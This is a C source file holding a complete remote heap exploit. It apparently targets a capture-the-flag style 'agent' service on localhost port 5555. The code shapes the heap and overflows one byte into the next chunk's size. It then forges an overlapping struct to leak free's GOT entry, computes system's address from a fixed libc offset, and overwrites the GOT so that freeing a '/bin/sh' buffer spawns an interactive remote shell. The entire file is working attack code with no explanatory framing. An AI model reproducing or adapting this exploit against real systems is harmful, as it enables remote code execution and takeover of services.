#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <inttypes.h>
 
#define HOSTNAME  "localhost"
#define PORT	  5555
#define GOTFREE   0x6015d8
#define SYSOFFSET 0x3b160
 
#define COLOR_SHELL "\033[31;01mshell\033[00m > "
 
int  setsock(char *hostname, int port);
void send_data(char *input, int len);
void session();
int  handle_error(char *msg);
 
void agent_create_ex(char c, int len);
void agent_create(char *buffer, int len);
void agent_select(int agent);
void agent_show(int agent, char *buffer, size_t len);
void agent_edit(int agent, char *buffer, int len);
void agent_delete(int agent);
 
void select_option(char *opt);
 
struct fake_agent {
	unsigned long chunk_size;
	unsigned int  len;
	unsigned long reserved_0;
	unsigned long name;
	unsigned int  id;
};
 
int sock;
 
int main()
{
	unsigned long system, free;
	struct fake_agent agent;
	char output[1024], input[1024];
 
	printf("[1] connecting to target ...\n");
	sock = setsock(HOSTNAME, PORT);
	printf("[+] connected\n");
	read(sock, output, 1024);
 
	printf("[2] shaping heap\n");
	agent_create_ex('A', 0x88 - 1);
	agent_create_ex('B', 0x88 - 1);
	agent_delete(0);
	agent_create_ex('C', 0xa0 + 2);
	agent_create_ex('D', 0xa0 + 2);
	agent_create_ex('E', 0x10);
	agent_edit(4, "/bin/sh", 7);
 
	printf("[3] overflowing next chunk\n");
	agent_delete(2);
	memset(input, 'B', 0x88);
	input[0x88] = 0xf1;
	agent_edit(1, input, 0x88 + 1);
 
	printf("[4] overlapping next chunk\n");
	agent.chunk_size = 0xb1;
	agent.len = 0xff;
	agent.reserved_0 = 0xdeadbeef;
	agent.name = GOTFREE;
	agent.id = 3;
 
	memset(input, 'F', 0xa6);
	memcpy(input + 0xa6, &agent, sizeof(struct fake_agent));
	agent_create(input, 0xa6 + sizeof(struct fake_agent));
 
	agent_show(3, output, sizeof(output));
	free = *((unsigned long *)(output));
	printf("[+] free function mapped at 0x%"PRIx64"\n", free);
	system = free - SYSOFFSET;
 
	printf("[+] system function mapped at 0x%"PRIx64"\n", system);
 
	printf("[5] pwning\n");
	agent_edit(3, (char *)&system, 6);
	agent_delete(4);
 
	session();
 
	return 0;
}
 
void agent_create(char *buffer, int len)
{
	select_option("1");
	send_data(buffer, len);
}
 
void agent_create_ex(char c, int len)
{
	char buffer[len];
	memset(buffer, c, len);
	agent_create(buffer, len);
}
 
void agent_select(int agent)
{
	char ag[4];
	int len = snprintf(ag, 4, "%d", agent);
	select_option("2");
	send_data(ag, len);
}
 
void agent_show(int agent, char *buffer, size_t len)
{
	int amt;
	agent_select(agent);
	write(sock, "3\n", 2);
	read(sock, buffer, len);
	amt = read(sock, buffer, len);
	buffer[amt] = '\0';
}
 
void agent_edit(int agent, char *buffer, int len)
{
	agent_select(agent);
	select_option("4");
	send_data(buffer, len);
}
 
void agent_delete(int agent)
{
	agent_select(agent);
	select_option("5");
}
 
void select_option(char *opt)
{
	send_data(opt, 2);
}
 
void send_data(char *input, int len)
{
	char output[1024];
	int amt;
	fd_set fds;
	struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
 
	write(sock, input, len);
 
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
 
	select(sock+1, &fds, NULL, NULL, &tv);
 
	if (FD_ISSET(sock, &fds)) {
		if ((amt = read(sock, output, 1024 - 1)) == 0) {
			handle_error("connection lost\n");
		}
		output[amt] = '\0';
	}
}
 
int setsock(char *hostname, int port)
{
	int s;
	struct hostent *hent;
	struct sockaddr_in sa;
	struct in_addr ia;
 
	hent = gethostbyname(hostname);
	if (hent) {
		memcpy(&ia.s_addr, hent->h_addr, 4);
	}
	else if((ia.s_addr = inet_addr(hostname)) == INADDR_ANY) {
		handle_error("incorrect address !!!\n");
	}
 
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		handle_error("socket failed !!!\n");
	}
 
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = ia.s_addr;
 
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
		handle_error("connection failed !!!!\n");
	}
 
	return s;
}
 
void session()
{
	char buf[1024];
	int amt;
	fd_set fds;
 
	printf("[!] enjoy your shell \n");
	fputs(COLOR_SHELL, stderr);
 
	while (1) {
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		FD_SET(0, &fds);
 
		if (select(sock+1, &fds, NULL, NULL, NULL) == -1) {
			continue;
		}
 
		if (FD_ISSET(0, &fds)) {
			if ((amt = read(0, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			write(sock, buf, strlen(buf));
		}
 
		if (FD_ISSET(sock, &fds)) {
			if ((amt = read(sock, buf, sizeof(buf) - 1)) == 0) {
				handle_error("connection lost\n");
			}
			buf[amt] = '\0';
			printf("%s", buf);
			fputs(COLOR_SHELL, stderr);
		}
	}
}
 
int handle_error(char *msg)
{
	perror(msg);
	exit(-1);
}
